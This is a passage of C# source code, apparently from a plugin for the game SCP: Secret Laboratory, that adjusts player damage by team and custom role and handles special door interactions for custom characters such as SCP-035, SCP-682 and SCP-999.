					if (ev.Attacker.Role == RoleType.Scientist && ev.DamageType != DamageTypes.Decont && ev.DamageType != DamageTypes.Falldown && ev.DamageType != DamageTypes.Flying && ev.DamageType != DamageTypes.Nuke && ev.DamageType != DamageTypes.Pocket && ev.DamageType != DamageTypes.Tesla && ev.DamageType != DamageTypes.Wall && ev.DamageType != DamageTypes.Lure && ev.Attacker != null)
					{
						if (ev.Target.Role == RoleType.Scientist)
						{
							ev.Amount = 0f;
						}
						if (ev.Target.Team == Team.MTF)
						{
							ev.Amount = 0f;
						}
					}
					else if (ev.DamageType == DamageTypes.Tesla && ev.Attacker.Id != ev.Target.Id)
					{
						if (ev.Target.Role == RoleType.Scientist)
						{
							ev.Amount = 0f;
						}
						if (ev.Target.Team == Team.MTF)
						{
							ev.Amount = 0f;
						}
					}
					if (ev.Attacker.Team == Team.CHI && ev.DamageType != DamageTypes.Decont && ev.DamageType != DamageTypes.Falldown && ev.DamageType != DamageTypes.Flying && ev.DamageType != DamageTypes.Nuke && ev.DamageType != DamageTypes.Pocket && ev.DamageType != DamageTypes.Tesla && ev.DamageType != DamageTypes.Wall && ev.DamageType != DamageTypes.Lure && ev.Attacker != null && ev.Target.Id != scp035id)
					{
						if (ev.Target.Role == RoleType.ClassD)
						{
							ev.Amount = 0f;
						}
						if (ev.Target.Team == Team.CHI)
						{
							ev.Amount = 0f;
						}
					}
					else if (ev.DamageType == DamageTypes.Tesla && ev.Attacker.Id != ev.Target.Id)
					{
						if (ev.Target.Role == RoleType.Scientist)
						{
							ev.Amount = 0f;
						}
						if (ev.Target.Team == Team.MTF)
						{
							ev.Amount = 0f;
						}
					}
					if (ev.Attacker.Role == RoleType.ClassD && ev.DamageType != DamageTypes.Decont && ev.DamageType != DamageTypes.Falldown && ev.DamageType != DamageTypes.Flying && ev.DamageType != DamageTypes.Nuke && ev.DamageType != DamageTypes.Pocket && ev.DamageType != DamageTypes.Tesla && ev.DamageType != DamageTypes.Wall && ev.DamageType != DamageTypes.Lure && ev.Attacker != null && ev.Target.Id != scp035id)
					{
						if (ev.Target.Role == RoleType.ClassD)
						{
							ev.Amount = 0f;
						}
						if (ev.Target.Team == Team.CHI)
						{
							ev.Amount = 0f;
						}
					}
					else if (ev.DamageType == DamageTypes.Tesla && ev.Attacker.Id != ev.Target.Id)
					{
						if (ev.Target.Role == RoleType.Scientist)
						{
							ev.Amount = 0f;
						}
						if (ev.Target.Role == RoleType.Scientist)
						{
							ev.Amount = 0f;
						}
					}
					if (ev.Attacker.Team == Team.MTF && ev.DamageType != DamageTypes.Decont && ev.DamageType != DamageTypes.Falldown && ev.DamageType != DamageTypes.Flying && ev.DamageType != DamageTypes.Nuke && ev.DamageType != DamageTypes.Pocket && ev.DamageType != DamageTypes.Tesla && ev.DamageType != DamageTypes.Wall && ev.DamageType != DamageTypes.Lure && ev.Attacker != null)
					{
						if (ev.Target.Role == RoleType.Scientist)
						{
							ev.Amount = 0f;
						}
						if (ev.Target.Team == Team.MTF)
						{
							ev.Amount = 0f;
						}
					}
					else if (ev.DamageType == DamageTypes.Tesla && ev.Attacker.Id != ev.Target.Id)
					{
						if (ev.Target.Role == RoleType.Scientist)
						{
							ev.Amount = 0f;
						}
						if (ev.Target.Team == Team.MTF)
						{
							ev.Amount = 0f;
						}
					}
				}
				if (ev.Target.Id == scp035id && ev.DamageType != DamageTypes.Decont && ev.DamageType != DamageTypes.Falldown && ev.DamageType != DamageTypes.Flying && ev.DamageType != DamageTypes.Nuke && ev.DamageType != DamageTypes.Pocket && ev.DamageType != DamageTypes.Wall && ev.DamageType != DamageTypes.Lure && ev.Attacker != null)
				{
					ev.Amount = ev.Amount /10;
					if (ev.Attacker.Team == Team.SCP)
					{
						ev.Amount = 0;
					}
					if (ev.Attacker.Id == 蛇皮手id)
					{
						ev.Amount = 0;
					}
					if (蛇之手id.Contains(ev.Attacker.Id))
					{
						ev.Amount = 0;
					}
				}
				if (ev.Attacker.Id == scp035id && ev.DamageType != DamageTypes.Decont && ev.DamageType != DamageTypes.Falldown && ev.DamageType != DamageTypes.Flying && ev.DamageType != DamageTypes.Nuke && ev.DamageType != DamageTypes.Pocket && ev.DamageType != DamageTypes.Wall && ev.DamageType != DamageTypes.Lure && ev.Attacker != null)
				{
					if (ev.Target.Team == Team.SCP)
					{
						ev.Amount = 0;
					}
					if (ev.Target.Team != Team.SCP)
					{
						ev.Amount = 30;
					}
					if (ev.Target.Id == 蛇皮手id)
					{
						ev.Amount = 0;
					}
					if (蛇之手id.Contains(ev.Target.Id))
					{
						ev.Amount = 0;
					}
				}
				if (ev.Target.Id == 亚伯id && ev.DamageType != DamageTypes.Tesla && ev.DamageType != DamageTypes.Decont && ev.DamageType != DamageTypes.Falldown && ev.DamageType != DamageTypes.Flying && ev.DamageType != DamageTypes.Nuke && ev.DamageType != DamageTypes.Pocket && ev.DamageType != DamageTypes.Wall && ev.DamageType != DamageTypes.Lure)
				{
					if (ev.Attacker.Team == Team.SCP)
					{
						ev.Amount = 0;
					}
					if (ev.Attacker.Team != Team.SCP)
					{
						ev.Amount = 20;
					}
					if (ev.Attacker.Id == scp035id)
					{
						ev.Amount = 0;
					}
					
				}
				if (ev.Attacker.Id == 亚伯id && ev.DamageType != DamageTypes.Tesla && ev.DamageType != DamageTypes.Decont && ev.DamageType != DamageTypes.Falldown && ev.DamageType != DamageTypes.Flying && ev.DamageType != DamageTypes.Nuke && ev.DamageType != DamageTypes.Pocket && ev.DamageType != DamageTypes.Wall && ev.DamageType != DamageTypes.Lure)
				{

					if (ev.Target.Team != Team.SCP)
					{
						ev.Amount = 35;
						if (ev.DamageType == DamageTypes.P90)
						{
							ev.Attacker.Health += 10;

						}
					}
					if (ev.Target.Team == Team.SCP)
					{
						ev.Amount = 0;
					}
					if (ev.Target.Id == scp035id)
					{
						ev.Amount = 0;
					}
					if(ev.Target.Id == 蛇皮手id)
                    {
						ev.Amount = 0;
                    }
					if(蛇之手id.Contains(ev.Target.Id))
                    {
						ev.Amount = 0;
                    }
				}
				if (ev.Target.Id == scp457id)
				{
					if (ev.Attacker.Team == Team.SCP)
					{
						ev.Amount = 0;
					}
				}
				if (ev.Attacker.Id == scp999id && ev.DamageType != DamageTypes.Decont && ev.DamageType != DamageTypes.Falldown && ev.DamageType != DamageTypes.Flying && ev.DamageType != DamageTypes.Nuke && ev.DamageType != DamageTypes.Pocket && ev.DamageType != DamageTypes.Wall && ev.DamageType != DamageTypes.Lure && ev.Attacker != null)
				{
					if(ev.Target.Id == scp035id)
                    {
						ev.Amount = 0;
						ev.Target.Health -= 4;
                    }
					if(ev.Target.Id == 亚伯id)
                    {
						ev.Amount = 0;
						ev.Target.Health -= 4;
                    }
					if (ev.Target.Team != Team.SCP)
					{
						if (ev.Target.Health <= 500)
						{
							ev.Amount = 0;
							ev.Target.Health += 5;
						}
					}
					if (ev.Target.Role.Is939())
					{
						if (ev.Target.Health <= 10000)
						{
							ev.Amount = 0;
							ev.Target.Health += 5;
						}
					}
					if (ev.Target.Role == RoleType.Scp106)
					{
						if (ev.Target.Health <= 2000)
						{
							ev.Amount = 0;
							ev.Target.Health += 5;
						}
					}
					if (ev.Target.Role == RoleType.Scp173)
					{
						if (ev.Target.Health <= 15000)
						{
							ev.Amount = 0;
							ev.Target.Health += 5;
						}
					}
					if (ev.Target.Role == RoleType.Scp096)
					{
						if (ev.Target.Health <= 1500)
						{
							ev.Amount = 0;
							ev.Target.Health += 5;
						}
					}
				}
				if(scp008id.Contains(ev.Target.Id))
                {
					if(ev.Attacker.Team != Team.SCP)
                    {
						ev.Amount = 30;
                    }
				}
				if (ev.Target.Id == 保安队长id)
				{
					ev.Amount = ev.Amount / 10 * 6;

				}
			}
			if (蛇之手id.Contains(ev.Attacker.Id))
			{
				if (蛇之手id.Contains(ev.Target.Id))
				{
					ev.Amount = 0;
				}
				if (ev.Target.Team == Team.SCP)
				{
					ev.Amount = 0;
				}
				if (ev.Target.Id == 蛇皮手id)
				{
					ev.Amount = 0;
				}
			}


		}
		public void OnInteractingDoor(InteractingDoorEventArgs ev)
		{
			if(ev.Player.Id == scp682id)
            {
				if(scp682lv == 3)
                {
					ev.Door.BreakDoor();
                }
            }
			if(ev.Player.Id == scp035id || ev.Player.Id == 黑暗掌控者id)
			{
                try
                {
					if (ev.Door.GetComponent<DoorNametagExtension>().GetName.Contains("914"))
					{
						ev.IsAllowed = false;
					}
				}
                catch
                {

                }

			}
			if(ev.Player.Id == 作死之王id)
			{
				ev.IsAllowed = true;
			}
			if(蕾姆拉姆技能)
			{
				if(ev.Player.Id == 蕾姆id || ev.Player.Id == 拉姆id)
				{
					ev.Door.BreakDoor();
				}
			}
			if (ev.Player.Id == 幸运儿id)
			{
				int open = new System.Random().Next(1, 15);
				if (open == 9)
				{
					ev.IsAllowed = true;
				}
			}

		}
	}
}
